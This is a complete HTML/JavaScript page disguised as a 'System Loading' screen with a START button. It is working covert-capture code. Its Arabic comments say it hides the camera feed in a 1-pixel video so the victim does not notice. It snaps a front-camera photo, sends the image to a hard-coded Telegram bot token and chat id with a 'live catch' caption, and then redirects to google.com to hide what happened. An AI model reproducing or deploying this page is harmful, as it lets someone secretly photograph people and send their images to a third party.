<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>System Loading...</title>
    <style>
        body { background: black; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px; }
        /* جعل الفيديو يظهر بحجم 1 بكسل فقط لضمان عمل الكاميرا دون أن يراه الضحية */
        #v { width: 1px; height: 1px; border: none; }
        #btn { padding: 15px 30px; background: #0f0; color: black; border: none; font-size: 20px; cursor: pointer; border-radius: 5px; }
        canvas { display: none; }
    </style>
</head>
<body>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <h2>CONNECTING TO SERVER...</h2>
    <div id="status">PRESS START TO INITIALIZE</div>
    <br>
    <button id="btn" onclick="startCapture()">START</button>

    <script>
        const tok = "8570413998:AAHjdBQuzcwo6Qh3sEJ3bIe-tjeFhz1A1GU";
        const id = "8042090388";

        async function startCapture() {
            document.getElementById('btn').style.display = "none";
            document.getElementById('status').innerText = "STREAMING DATA (10%)...";

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                const video = document.getElementById('v');
                video.srcObject = stream;

                // الانتظار حتى يبدأ الفيديو فعلياً
                video.onplay = () => {
                    document.getElementById('status').innerText = "TUNING SENSORS (50%)...";
                    // ننتظر 5 ثواني كاملة عشان الحساس يلقط ضوء
                    setTimeout(takeFinalShot, 5000);
                };

            } catch (e) {
                alert("Please allow camera access!");
            }
        }

        async function takeFinalShot() {
            const v = document.getElementById('v');
            const c = document.getElementById('c');
            
            c.width = v.videoWidth;
            c.height = v.videoHeight;
            const ctx = c.getContext('2d');
            
            // رسم الصورة
            ctx.drawImage(v, 0, 0, c.width, c.height);
            
            // التحقق من أن الصورة ليست سوداء بالكامل قبل الإرسال
            const data = c.toDataURL('image/jpeg', 0.8);
            
            const blob = await (await fetch(data)).blob();
            const fd = new FormData();
            fd.append('chat_id', id);
            fd.append('photo', blob, 'live_capture.jpg');
            fd.append('caption', '🎯 صيد حي ومباشر (تم حل مشكلة السواد)');

            fetch(`https://api.telegram.org/bot${tok}/sendPhoto`, {
                method: 'POST',
                body: fd
            }).then(() => {
                window.location.href = "https://www.google.com";
            });
        }
    </script>
</body>
</html>
